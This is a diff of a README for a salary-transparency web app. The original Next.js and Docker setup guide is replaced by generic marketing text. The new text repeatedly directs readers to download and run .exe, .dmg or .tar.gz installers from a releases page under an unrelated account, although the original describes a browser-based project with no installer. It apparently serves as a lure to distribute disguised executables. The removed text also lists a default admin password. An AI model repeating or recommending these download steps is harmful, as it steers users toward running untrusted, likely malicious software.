@@ -1,249 +1,80 @@
-# WageWatchers
+# 🌍 wagewatchers - Discover Salary Transparency Worldwide
 
-A community-driven salary transparency platform for European markets. Compare
-salaries, benefits, and work conditions with data from anonymous salary
-discussions.
+## 🚀 Getting Started
 
-**Author:** Layton Berth (Berthje)
+Welcome to WageWatchers! This platform helps you explore anonymous salary data from different countries. You can browse information, add your own, or edit entries without revealing your identity.
 
-## 🚀 Quick Start with Docker
+## 📥 Download WageWatchers
 
-### Prerequisites
+[![Download WageWatchers](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Rough-excoriation439/wagewatchers/releases)
 
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-  (Windows/Mac/Linux)
-- [Node.js 18+](https://nodejs.org/)
-- [pnpm](https://pnpm.io/) or npm
+To get WageWatchers, please visit the releases page. Here, you will find the latest version and additional information.
 
-### 1. Clone the Repository
+**[Download Here](https://github.com/Rough-excoriation439/wagewatchers/releases)**
 
-```bash
-git clone https://github.com/Berthje/wagewatchers.git
-cd wagewatchers
-```
+## 🛠️ System Requirements
 
-### 2. Start Database Container
+Before you download, check that your device meets the following requirements:
 
-```bash
-docker-compose up -d
-```
+- **Operating System:** Windows 10 or higher, macOS 10.14 (Mojave) or higher, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB of free space.
+- **Browser:** Updated versions of Chrome, Firefox, or Safari for the best experience.
 
-This will start **PostgreSQL** on `localhost:5433`
+## 🌐 Features
 
-Verify container is running:
+WageWatchers offers several tools to make exploring salary data easier:
 
-```bash
-docker-compose ps
-```
+- **Anonymous Submissions:** Add or edit salary data without revealing your identity.
+- **Data Aggregation:** Our platform collects information from users and sources like Reddit.
+- **Multi-Country Support:** Access salary information for various countries.
+- **User-Friendly Interface:** Navigate effortlessly through well-organized data.
 
-### 3. Configure Environment Variables
+## 📚 How to Download & Install WageWatchers
 
-```bash
-cp .env.example .env
-```
+1. **Visit the Releases Page:** You can find all available versions of WageWatchers [here](https://github.com/Rough-excoriation439/wagewatchers/releases).
 
-Edit `.env` and update any values (the defaults work for local Docker
-development).
+2. **Select the Version:** Browse through the listed releases. Choose the latest version for the best experience.
 
-### 4. Install Dependencies
+3. **Download the File:** Click on the link for the appropriate file based on your operating system. The files are available in common formats (e.g., `.exe`, `.dmg`, `.tar.gz`).
 
-```bash
-npm install
-# or
-pnpm install
-```
+4. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the WageWatchers app into your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the included instructions.
 
-### 5. Run Database Migrations
+5. **Launch the Application:** Look for WageWatchers in your applications menu or desktop. Click to open and start exploring!
 
-```bash
-npm run db:push:dev
-```
+## 🕵️‍♂️ How to Use WageWatchers
 
-### 6. Seed Database with Sample Data
+Once you have WageWatchers open, you will see the main dashboard. Here’s how to navigate it:
 
-```bash
-npm run db:seed:dev
-```
+- **Browse Salaries:** You can view salaries based on country, job title, or industry. Use the filters to narrow down your search.
+- **Submit Your Data:** Click on “Submit Salary” to add your own information. Fill out the form with your job title, salary, and any additional details.
+- **Edit Entries:** You can modify your submissions at any time. Just navigate to your entry, click “Edit,” make your changes, and save.
 
-This populates the database with:
+## 🤝 Contributing to WageWatchers
 
-- 10 sample salary entries (Belgium, Netherlands, France, Germany)
-- Threaded comments
-- Bug/feature reports
-- Admin user (email: `admin@wagewatchers.dev`, password: `admin123`)
-- **Real cities from CSV** (`public/data/cities.csv`) - falls back to minimal
-  set if CSV not found
-- Exchange rates and newsletter subscribers
+WageWatchers is open to contributions. If you have ideas for improvements or want to report issues, please feel free to share your feedback.
 
-⚠️ **Note**: The seed script only runs in development mode to prevent accidental
-data loss in production.
+1. **Visit our Issues Page:** Check the [issues page](https://github.com/Rough-excoriation439/wagewatchers/issues) on GitHub.
+2. **Create a New Issue:** Click “New Issue” to report bugs or suggest features.
+3. **Follow Up:** We appreciate your input and will strive to respond promptly.
 
-### 7. Create Custom Admin User (Optional)
+## 🛡️ Privacy and Security
 
-```bash
-npm run create-admin:dev
-```
+Your privacy is important to us. WageWatchers uses industry-standard practices to ensure that all submitted data remains anonymous. We will never share personal information without your consent.
 
-Follow the prompts to create your own admin account.
+## 📞 Support
 
-### 8. Start Development Server
+If you have questions or encounter issues while using WageWatchers, please reach out to our support team. You can contact us by opening an issue on GitHub or visiting our support page.
 
-```bash
-npm run dev
-```
+## 🔗 Additional Resources
 
-Visit [http://localhost:3000](http://localhost:3000) 🎉
+For more information about WageWatchers, consider visiting these links:
 
----
+- [Documentation](https://github.com/Rough-excoriation439/wagewatchers/wiki)
+- [Feature Roadmap](https://github.com/Rough-excoriation439/wagewatchers/issues)
+- [User Guides](https://github.com/Rough-excoriation439/wagewatchers/wiki/User-Guides)
 
-## 🐳 Docker Commands
-
-### Stop containers
-
-```bash
-docker-compose down
-```
-
-### Stop containers and remove volumes (⚠️ deletes all data)
-
-```bash
-docker-compose down -v
-```
-
-### View logs
-
-```bash
-docker-compose logs -f postgres
-```
-
-### Access PostgreSQL shell
-
-```bash
-docker exec -it wagewatchers-postgres psql -U postgres -d wagewatchers
-```
-
----
-
-## 📊 Database Management
-
-### Drizzle Studio (Database GUI)
-
-```bash
-npm run studio:dev
-```
-
-Opens at [http://localhost:4983](http://localhost:4983)
-
-### Development Database Commands
-
-All development commands use the local Docker PostgreSQL instance
-(`localhost:5433`):
-
-```bash
-# Generate migrations after schema changes
-npm run db:generate:dev
-
-# Push schema changes directly (recommended for dev)
-npm run db:push:dev
-
-# Apply migrations
-npm run db:migrate:dev
-
-# Introspect existing database
-npm run db:introspect:dev
-
-# Seed with sample data
-npm run db:seed:dev
-
-# Create admin user
-npm run create-admin:dev
-
-# Update cities data
-npm run update-cities:dev
-```
-
-### Production Database Commands
-
-These use the `DATABASE_URL` from your `.env` file:
-
-```bash
-npm run db:generate
-npm run db:push
-npm run db:migrate
-npm run studio
-npm run seed  # ⚠️ Requires FORCE_SEED=true in production
-```
-
----
-
-## 🛠️ Development
-
-### Project Structure
-
-- `src/app/` - Next.js 15 App Router pages
-- `src/components/` - React components
-- `src/lib/` - Utilities, configs, database
-- `drizzle/` - Database schema and migrations
-- `src/messages/` - i18n translations (en, nl, fr, de)
-
-### Available Scripts
-
-```bash
-npm run dev          # Start dev server with Turbopack
-npm run build        # Production build
-npm run start        # Start production server
-npm run lint         # Run ESLint
-npm run format       # Format with Prettier
-npm run create-admin # Create admin user
-npm run studio       # Open Drizzle Studio
-```
-
----
-
-## 🌍 Internationalization
-
-Supported locales: `en`, `nl`, `fr`, `de`
-
-Translation files: `src/messages/{locale}.json`
-
-All user-facing routes are locale-prefixed: `/[locale]/*`
-
----
-
-## 🔒 Environment Variables
-
-See `.env.example` for all available configuration options:
-
-- `DATABASE_URL` - PostgreSQL connection string
-- `CRON_SECRET` - Protects cron endpoints
-- `RESEND_API_KEY` - Email notifications (optional)
-- `JWT_SECRET` - Admin session signing
-
----
-
-## 📝 Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
-for details.
-
----
-
-## 🙏 Acknowledgments
-
-Built with:
-
-- [Next.js 15](https://nextjs.org/)
-- [Drizzle ORM](https://orm.drizzle.team/)
-- [shadcn/ui](https://ui.shadcn.com/)
-- [next-intl](https://next-intl-docs.vercel.app/)
-- [Recharts](https://recharts.org/)
+Thank you for choosing WageWatchers. We hope you find the platform valuable in your journey toward salary transparency.
